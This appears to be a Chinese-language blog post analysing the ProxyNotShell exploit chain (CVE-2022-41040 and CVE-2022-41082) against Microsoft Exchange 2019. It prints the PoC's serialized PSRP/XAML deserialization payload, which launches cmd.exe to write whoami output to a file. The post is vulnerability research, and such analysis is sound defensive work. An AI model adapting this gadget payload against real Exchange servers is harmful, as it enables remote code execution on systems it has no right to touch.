<!doctype html><html lang=zh-cn class="js csstransforms3d"><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.120.4"><meta name=description content="记录一些学习和生活日常"><meta name=author content="darkmoon"><link rel=icon href=/images/favicon.png type=image/png><title>Proxy Not Shell 利用链分析 - chestnut's blog</title>
<link href=/css/nucleus.css?1701075322 rel=stylesheet><link href=/css/fontawesome-all.min.css?1701075322 rel=stylesheet><link href=/css/hybrid.css?1701075322 rel=stylesheet><link href=/css/featherlight.min.css?1701075322 rel=stylesheet><link href=/css/perfect-scrollbar.min.css?1701075322 rel=stylesheet><link href=/css/auto-complete.css?1701075322 rel=stylesheet><link href=/css/atom-one-dark-reasonable.css?1701075322 rel=stylesheet><link href=/css/theme.css?1701075322 rel=stylesheet><link href=/css/tabs.css?1701075322 rel=stylesheet><link href=/css/hugo-theme.css?1701075322 rel=stylesheet><link href=/css/theme-blue.css?1701075322 rel=stylesheet><script src=/js/dayjs.min.js?1701075322></script><script src=/js/jquery-3.3.1.min.js?1701075322></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-F5TRJPEVXY"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-F5TRJPEVXY")</script><style>:root #header+#content>#left>#rlblock_left{display:none!important}</style></head><body data-url=/zh-cn/vulnerability/proxy-not-shell/><nav id=sidebar class=showVisitedLinks><div id=header-wrapper><div id=header><a id=logo href=/zh-cn><svg id="grav-logo" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 285.1 69.9"><g><path d="M35 0c9.6.0 17.9 3.4 24.7 10.3C66.5 17.1 70 25.3 70 35s-3.4 17.9-10.3 24.7C52.9 66.5 44.7 70 35 70c-9.7.0-17.9-3.4-24.7-10.3C3.4 52.8.0 44.6.0 34.9.0 25.3 3.4 17 10.3 10.2 17.1 3.4 25.3.0 35 0zM22.3 63.7c.3-7.4.3-14.7.0-22.1-2.1-.4-4-.4-5.9.0-.2.8-.2 2.5-.1 4.9.1 2.3.0 3.9-.3 4.8-1.7-.6-2.7-2.1-3.1-4.6-.1-.7-.1-3.3-.1-8 0-14.5-.1-23-.3-25.6-3.6 4.1-5.6 7-5.9 8.5v10.9c0 4.5.1 8.1.2 10.9.0.4.0 1.3-.1 2.8-.1 1.2.0 2.1.1 2.6.1.6 1.1 2.1 2.8 4.7C13.2 58.7 17.5 62.2 22.3 63.7zm22.3 1.7c.3-5 .2-12.9-.1-23.6-2.1-.3-4.1-.3-5.9.0-.2 2-.2 5.1-.1 9.5.1 4.3.0 7.5-.1 9.5-2.9.4-5 .3-6.2-.1-.2-5.6-.2-15.2-.1-28.7.1-12.4.0-21.8-.3-28.3-2.4.1-4.3.6-5.7 1.3-.1 7.7-.2 17.7-.1 30.1.0 16.5.0 26.6.0 30.3 2.3 1.1 5.4 1.7 9.4 1.7C38.9 66.9 42.1 66.4 44.6 65.4zM48.1 64.1c9.7-4.6 15.7-12 18-22.2-1.8-.2-3.8-.3-6.1-.3-1.6 3.9-2.6 6.3-3.2 7.2-1.1 1.7-2 2.5-2.7 2.5C54 46 54 39.1 54 30.5c0-11.5.0-18.4.0-20.9-1.4-1.4-3.3-2.5-5.7-3.4C48.1 6.3 48 6.4 48 6.7c0 3.5.0 13.1.0 28.8C47.9 47.2 48 56.8 48.1 64.1z"/></g><g><path d="M116.6 51.3h-29c-.5.0-.9-.1-1.3-.2-.4-.2-.7-.4-1-.7-.3-.3-.5-.6-.7-1s-.2-.8-.2-1.3V16.3h6.3V45h25.8v6.3z"/><path d="M154.8 51.3h-22.9c-.9.0-1.8-.2-2.9-.5-1-.3-2-.8-2.9-1.5s-1.6-1.6-2.2-2.8c-.6-1.1-.9-2.5-.9-4.2V19.5c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1s.6-.5 1-.7.8-.2 1.3-.2h28.6v6.3h-25.4v19.8c0 .8.2 1.5.7 1.9s1.1.7 1.9.7h22.9v6.2zM151.9 37h-20v-6.4h20V37z"/><path d="M197.3 51.3H191v-8.6h-22.3v8.6h-6.3V33.8c0-2.6.4-4.9 1.3-7.1s2.1-4 3.7-5.5 3.4-2.8 5.5-3.6c2.1-.9 4.5-1.3 7-1.3h14.3c.4.0.9.1 1.2.2.4.2.7.4 1 .7s.5.6.7 1 .2.8.2 1.2V51.3zM168.7 36.4H191V22.6h-11.2c-.2.0-.6.0-1.2.1s-1.4.2-2.2.4c-.8.2-1.7.6-2.6 1-.9.5-1.8 1.1-2.5 2-.8.8-1.4 1.9-1.9 3.1-.5 1.2-.7 2.8-.7 4.5v2.7z"/><path d="M241.7 28.1c0 1.4-.2 2.7-.5 3.9-.4 1.1-.8 2.1-1.5 3-.6.9-1.3 1.6-2.1 2.2-.8.6-1.6 1.1-2.5 1.5s-1.8.7-2.6.9c-.9.2-1.7.3-2.5.3l13.3 11.5h-9.8l-13.2-11.5h-4.6v-6.3H230c.8-.1 1.5-.2 2.2-.5s1.2-.6 1.7-1.1.9-1 1.1-1.6c.3-.6.4-1.4.4-2.2v-4c0-.4.0-.6-.1-.8s-.2-.3-.3-.4c-.1-.1-.3-.1-.4-.2-.2.0-.3.0-.4.0h-20.9v28.7H207v-32c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1 .3-.3.6-.5 1-.7s.8-.2 1.3-.2H234c1.4.0 2.6.3 3.6.8s1.8 1.2 2.4 1.9c.6.8 1 1.6 1.3 2.5s.4 1.7.4 2.5v4z"/><path d="M285.1 48.6c0 .5-.1.9-.3 1.3s-.4.7-.7 1-.6.5-1 .7-.8.2-1.2.2-.8-.1-1.2-.2-.8-.4-1.1-.7l-23.2-24.2v24.7h-6.3V19c0-.7.2-1.2.5-1.8.4-.5.8-.9 1.4-1.2.6-.2 1.2-.3 1.9-.2s1.2.4 1.6.9l23.2 24.2V16.3h6.3V48.6z"/></g></svg></a></div><div class=searchbox><label for=search-by><i class="fas fa-search"></i></label>
<input data-search-input id=search-by type=search placeholder=搜索...>
<span data-search-clear><i class="fas fa-times"></i></span></div><script type=text/javascript src=/js/lunr.min.js?1701075322></script><script type=text/javascript src=/js/auto-complete.js?1701075322></script><script type=text/javascript>var baseurl="https://www.ch35tnut.site/zh-cn"</script><script type=text/javascript src=/js/search.js?1701075322></script></div><section id=homelinks><ul><li><a class=padding href=/zh-cn><i class='fas fa-home'></i> 首页</a></li></ul></section><div class=highlightable><ul class=topics><li data-nav-id=/zh-cn/research/ title=安全研究 class=dd-item><a href=/zh-cn/research/><b>X. </b>安全研究
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/windows/ title=Windows class=dd-item><a href=/zh-cn/research/windows/><b>X. </b>Windows
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/windows/dll-inject/ title=Dll注入 class=dd-item><a href=/zh-cn/research/windows/dll-inject/><b>X. </b>Dll注入
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/windows/pe/ title=Pe class=dd-item><a href=/zh-cn/research/windows/pe/><b>X. </b>Pe
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/protocol/ title=协议 class=dd-item><a href=/zh-cn/research/protocol/><b>X. </b>协议
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/protocol/ntlm/ title="Ntlm 协议" class=dd-item><a href=/zh-cn/research/protocol/ntlm/><b>X. </b>Ntlm 协议
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/protocol/kerberos/ title="Kerberos 协议" class=dd-item><a href=/zh-cn/research/protocol/kerberos/><b>X. </b>Kerberos 协议
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/protocol/kerberos/kerberos-in-windows/ title=Windows中的kerberos协议 class=dd-item><a href=/zh-cn/research/protocol/kerberos/kerberos-in-windows/><b>X. </b>Windows中的kerberos协议
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/ title=认证原理 class=dd-item><a href=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/>认证原理
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/protocol/netlogon/ title=Netlogon class=dd-item><a href=/zh-cn/research/protocol/netlogon/>Netlogon
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/web/ title=Web class=dd-item><a href=/zh-cn/research/web/><b>X. </b>Web
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/code-audit/ title=代码审计 class=dd-item><a href=/zh-cn/research/code-audit/><b>X. </b>代码审计
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/code-audit/wireshark-185/ title="Wireshark 1.8.5代码审计" class=dd-item><a href=/zh-cn/research/code-audit/wireshark-185/>Wireshark 1.8.5代码审计
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/code-audit/news-server/ title="News Server审计" class=dd-item><a href=/zh-cn/research/code-audit/news-server/>News Server审计
<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li><li data-nav-id=/zh-cn/vulnerability/ title=漏洞分析 class="dd-item
parent"><a href=/zh-cn/vulnerability/><b>X. </b>漏洞分析
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/ title="Windows CLFS EoP" class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/><b>X. </b>Windows CLFS EoP
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/ title="CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/>CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/ title="CVE-2023-36563 Wordpad Info Disclosure 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/>CVE-2023-36563 Wordpad Info Disclosure 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/squid-dos/ title="Squid Dos" class=dd-item><a href=/zh-cn/vulnerability/squid-dos/>Squid Dos
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/ title="CVE 2023 4966 Citrix Gateway Info Disclosure" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/>CVE 2023 4966 Citrix Gateway Info Disclosure
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/ title="CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/>CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/ title="CVE-2023-38545 Curl 堆溢出漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/>CVE-2023-38545 Curl 堆溢出漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/ title="CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/>CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/ title="瑞友天翼 Rce分析" class=dd-item><a href=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/>瑞友天翼 Rce分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/ title="CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/>CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/ title="CVE-2023-38148 Windows Ics Rce分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/>CVE-2023-38148 Windows Ics Rce分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/ title="CVE-2023-3519 Cirtix Gateway RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/>CVE-2023-3519 Cirtix Gateway RCE分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/smartbi-rce/ title="Smartbi Rce" class=dd-item><a href=/zh-cn/vulnerability/smartbi-rce/>Smartbi Rce
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/ title="CVE-2023-2825 Gitlab 路径穿越漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/>CVE-2023-2825 Gitlab 路径穿越漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/zero-logon/ title="Zero Logon 分析" class=dd-item><a href=/zh-cn/vulnerability/zero-logon/>Zero Logon 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/ title="CVE-2022-4223 PgAdmin RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/>CVE-2022-4223 PgAdmin RCE 分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/ title="CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/ title="CVE-2023-28432 MinIO 信息泄露漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/>CVE-2023-28432 MinIO 信息泄露漏洞分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/proxy-not-shell/ title="Proxy Not Shell 利用链分析" class="dd-item active"><a href=/zh-cn/vulnerability/proxy-not-shell/>Proxy Not Shell 利用链分析
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/ title="CVE-2021-40449 Win32k 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/>CVE-2021-40449 Win32k 权限提升漏洞分析
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/dailylife/ title=生活随笔 class=dd-item><a href=/zh-cn/dailylife/><b>X. </b>生活随笔
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/misc/ title=杂项 class=dd-item><a href=/zh-cn/misc/><b>X. </b>杂项
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/ title=隧道 class=dd-item><a href=/zh-cn/misc/tunnel/><b>X. </b>隧道
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/application-layer/ title=应用层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/application-layer/><b>X. </b>应用层隧道
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/ title=SSH隧道 class=dd-item><a href=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/>SSH隧道
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/transport-layer/ title=传输层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/transport-layer/><b>X. </b>传输层隧道
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/misc/tunnel/transport-layer/socks/ title=Socks协议 class=dd-item><a href=/zh-cn/misc/tunnel/transport-layer/socks/><b>X. </b>Socks协议
<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/tunnel/network-layer/ title=网络层隧道 class=dd-item><a href=/zh-cn/misc/tunnel/network-layer/><b>X. </b>网络层隧道
<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li><li data-nav-id=/zh-cn/others/ title=其他 class=dd-item><a href=/zh-cn/others/><b>X. </b>其他
<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/others/add-timeline-shortcode/ title=给hugo-theme-learn增加timeline功能 class=dd-item><a href=/zh-cn/others/add-timeline-shortcode/>给hugo-theme-learn增加timeline功能
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/ title="在Windows server 2019上重置密码" class=dd-item><a href=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/>在Windows server 2019上重置密码
<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/ title=基于Vmware的小型域网络搭建 class=dd-item><a href=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/>基于Vmware的小型域网络搭建
<i class="fas fa-check read-icon"></i></a></li></ul></li></ul><section id=shortcuts><h3>更多</h3><ul><li><a class=padding href=https://www.ch35tnut.site/zh-cn/about><i class='fas fa-person-booth'></i> 关于</a></li><li><a class=padding href=https://github.com/Chestnut4/><i class='fab fa-github'></i> Github 链接</a></li><li><a class=padding href=https://www.ch35tnut.site/zh-cn/tags><i class='fas fa-tags'></i> 标签</a></li><li><a class=padding href=https://www.ch35tnut.site/zh-cn/index.xml><i class='fas fa-fw fa-link'></i> RSS</a></li></ul></section><section id=prefooter><hr><ul><li><a class=padding><i class="fas fa-language fa-fw"></i><div class=select-style><select id=select-language onchange="location=this.value"><option id=zh-cn value=https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/ selected>简体中文</option></select><svg id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="255" height="255" viewBox="0 0 255 255" style="enable-background:new 0 0 255 255"><g><g id="arrow-drop-down"><polygon points="0,63.75 127.5,191.25 255,63.75"/></g></g></svg></div></a></li><li><a class=padding href=# data-clear-history-toggle><i class="fas fa-history fa-fw"></i> 清理历史记录</a></li></ul></section><section id=footer><center></center><script async defer src=https://buttons.github.io/buttons.js></script></section></div></nav><section id=body><div id=overlay></div><div class="padding highlightable"><div><div id=top-bar><div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb><span id=sidebar-toggle-span><a href=# id=sidebar-toggle data-sidebar-toggle><i class="fas fa-bars"></i>
</a></span><span id=toc-menu><i class="fas fa-list-alt"></i></span>
<span class=links><a href=/zh-cn/>首页</a> > <a href=/zh-cn/vulnerability/>漏洞分析</a> > Proxy Not Shell 利用链分析</span></div><div class=progress><div class=wrapper><nav id=TableOfContents><ul><li><ul><li><a href=#漏洞环境>漏洞环境</a></li><li><a href=#漏洞分析>漏洞分析</a></li><li><a href=#调试>调试</a></li><li><a href=#小结>小结</a></li></ul></li></ul></nav></div></div></div></div><div id=head-tags><div class=tags><a class=tag-link href=/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90>漏洞分析</a></div></div><div id=body-inner><h1>Proxy Not Shell 利用链分析</h1><div class=progress><div class=wrapper></div></div><nav id=TableOfContents><ul><li><ul><li><a href=#漏洞环境>漏洞环境</a></li><li><a href=#漏洞分析>漏洞分析</a></li><li><a href=#调试>调试</a></li><li><a href=#小结>小结</a></li></ul></li></ul></nav><h3 id=漏洞环境>漏洞环境</h3><ul><li>Windows Server 2019</li><li>Windows Exchange 2019 CU9</li></ul><h3 id=漏洞分析>漏洞分析</h3><p>漏洞链包含了两个漏洞：</p><ul><li>CVE-2022-41040 Exchange 权限提升漏洞</li><li>CVE-2022-41082 Exchange 远程代码执行漏洞</li></ul><p>CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。</p><p>CVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。</p><p>在PoC中发送了以下三种类型的PSRP消息</p><ul><li><p>0x00010002 SESSION_CAPABILITY</p><p>SESSION_CAPABILITY 应该是创建RunspacePool</p></li><li><p>0x00010004 INIT_RUNSPACEPOOL</p><p>INIT_RUNSPACEPOOL 应该是初始化RunspacePool</p></li><li><p>0x00021006 CREATE_PIPELINE</p><p>创建命令管道并在指定的 RunspacePool 中调用它</p></li></ul><p>PoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。</p><p>PoC主要组成部分如下所示，BA标签内是base64编码的序列化<em>System.UnitySerializationHolder</em>对象</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;Obj</span> <span style=color:#a6e22e>N=</span><span style=color:#e6db74>&#34;V&#34;</span> <span style=color:#a6e22e>RefId=</span><span style=color:#e6db74>&#34;14&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;TN</span> <span style=color:#a6e22e>RefId=</span><span style=color:#e6db74>&#34;2&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;T&gt;</span>System.ServiceProcess.ServiceController<span style=color:#f92672>&lt;/T&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;T&gt;</span>System.Object<span style=color:#f92672>&lt;/T&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;/TN&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;ToString&gt;</span>System.ServiceProcess.ServiceController<span style=color:#f92672>&lt;/ToString&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;Props&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;S</span> <span style=color:#a6e22e>N=</span><span style=color:#e6db74>&#34;Name&#34;</span><span style=color:#f92672>&gt;</span>Type<span style=color:#f92672>&lt;/S&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;Obj</span> <span style=color:#a6e22e>N=</span><span style=color:#e6db74>&#34;TargetTypeForDeserialization&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>							<span style=color:#f92672>&lt;TN</span> <span style=color:#a6e22e>RefId=</span><span style=color:#e6db74>&#34;2&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>								<span style=color:#f92672>&lt;T&gt;</span>System.Exception<span style=color:#f92672>&lt;/T&gt;</span>
</span></span><span style=display:flex><span>								<span style=color:#f92672>&lt;T&gt;</span>System.Object<span style=color:#f92672>&lt;/T&gt;</span>
</span></span><span style=display:flex><span>							<span style=color:#f92672>&lt;/TN&gt;</span>
</span></span><span style=display:flex><span>							<span style=color:#f92672>&lt;MS&gt;</span>
</span></span><span style=display:flex><span>								<span style=color:#f92672>&lt;BA</span> <span style=color:#a6e22e>N=</span><span style=color:#e6db74>&#34;SerializationData&#34;</span><span style=color:#f92672>&gt;</span>AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=<span style=color:#f92672>&lt;/BA&gt;</span>
</span></span><span style=display:flex><span>							<span style=color:#f92672>&lt;/MS&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;/Obj&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;/Props&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;S&gt;</span>
</span></span><span style=display:flex><span>                        <span style=color:#75715e>&lt;![CDATA[&lt;ResourceDictionary xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34; xmlns:x=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34; xmlns:System=&#34;clr-namespace:System;assembly=mscorlib&#34; xmlns:Diag=&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&gt;&lt;ObjectDataProvider x:Key=&#34;LaunchCalch&#34; ObjectType=&#34;{x:Type Diag:Process}&#34; MethodName=&#34;Start&#34;&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;System:String&gt;cmd.exe&lt;/System:String&gt;&lt;System:String&gt;/c whoami&gt; c:\users\public\1.txt&lt;/System:String&gt; &lt;/ObjectDataProvider.MethodParameters&gt; &lt;/ObjectDataProvider&gt; &lt;/ResourceDictionary&gt;]]&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;/S&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;/Obj&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>XamlReader.Parse()
</span></span><span style=display:flex><span>BA标签数据
</span></span><span style=display:flex><span>.....ÿÿÿÿ..............System.UnitySerializationHolder.....
</span></span><span style=display:flex><span>Data	UnityType.AssemblyName......... System.Windows.Markup.XamlReader.........
</span></span><span style=display:flex><span>XPresentationFramework, Version=4.0.0.0, Culture=neutral,
</span></span><span style=display:flex><span>PublicKeyToken=31bf3856ad364e35.
</span></span></code></pre></div><p>PoC部分由两个对象嵌套而成，大致结构如下所示：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>Obj V(System.ServiceProcess.ServiceController):
</span></span><span style=display:flex><span>		String Name=&#34;Type&#34;
</span></span><span style=display:flex><span>		Obj TargetTypeForDeserialization(System.Exception):
</span></span><span style=display:flex><span>				ByteArray SerializationData
</span></span><span style=display:flex><span>		String SerializationData
</span></span></code></pre></div><p><strong>代码逻辑</strong></p><p>代码逻辑如下图</p><!doctype html><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:ev="http://www.w3.org/2001/xml-events" xmlns:v="http://schemas.microsoft.com/visio/2003/SVGExtensions/" width="10.4331in" height="18.8976in" viewBox="0 0 751.181 1360.63" color-interpolation-filters="sRGB" class="st12"><v:documentProperties v:langID="2052" v:metric="true" v:viewMarkup="false"><v:userDefs><v:ud v:nameU="msvNoAutoConnect" v:val="VT0(0):26"/></v:userDefs></v:documentProperties><style>.st1{fill:url(#grad3-4);stroke:none;stroke-linecap:round;stroke-linejoin:round;stroke-width:.5}.st2{fill:#1ba1e2;stroke:#fff;stroke-linecap:round;stroke-linejoin:round;stroke-width:.5}.st3{fill:#fff;font-family:Segoe UI;font-size:.666664em}.st4{font-family:黑体;font-size:1em}.st5{font-size:1em}.st6{marker-end:url(#mrkr4-19);stroke:#1998d6;stroke-linecap:round;stroke-linejoin:round;stroke-width:.5}.st7{fill:#1998d6;fill-opacity:1;stroke:#1998d6;stroke-opacity:1;stroke-width:.16556291390728}.st8{fill:#fff;stroke:none;stroke-linecap:butt;stroke-width:7.2}.st9{fill:#1076a7;font-family:黑体;font-size:.666664em}.st10{font-family:Segoe UI;font-size:1em}.st11{fill:#fff;font-family:黑体;font-size:.666664em}.st12{fill:none;fill-rule:evenodd;font-size:12px;overflow:visible;stroke-linecap:square;stroke-miterlimit:3}</style><defs id="Patterns_And_Gradients"><radialGradient id="grad3-4" cx=".5" cy=".5" r=".73"><stop offset="0" stop-color="#d2ecf9" stop-opacity="1"/><stop offset="1" stop-color="#e7f5fc" stop-opacity="1"/></radialGradient></defs><defs id="Markers"><g id="lend4"><path d="M2 1 0 0 2-1V1" style="stroke:none"/></g><marker id="mrkr4-19" class="st7" v:arrowType="4" v:arrowSize="2" v:setback="12.08" refX="-12.08" orient="auto" markerUnits="strokeWidth" overflow="visible"><use xlink:href="#lend4" transform="scale(-6.04,-6.04)"/></marker></defs><g 